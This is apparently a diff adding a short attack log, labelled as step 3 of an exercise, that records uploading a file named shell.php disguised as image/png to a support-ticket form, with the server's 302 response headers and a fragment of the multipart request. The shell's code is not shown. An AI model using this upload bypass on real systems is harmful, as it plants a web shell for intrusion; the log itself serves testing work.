@@ -1,0 +1,18 @@
+###### Part B1 (step 3): upload shell.php as image/png ######
+>>> RESPONSE STATUS/HEADERS:
+HTTP/1.1 302 Found
+Server: nginx/1.27.5
+Date: Mon, 12 Oct 2026 18:27:17 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 0
+Connection: keep-alive
+Location: /view/?ticket=support-9&email=jdoe%40example.com&key=4c296f6b-d8b0-4429-8e95-b118d4bcda3e
+X-Frame-Options: DENY
+Vary: Cookie
+X-Content-Type-Options: nosniff
+Referrer-Policy: same-origin
+Cross-Origin-Opener-Policy: same-origin
+
+>>> multipart request body (from trace):
+033e: Content-Disposition: form-data; name="attachment"; filename="she
+0387: Content-Type: image/png
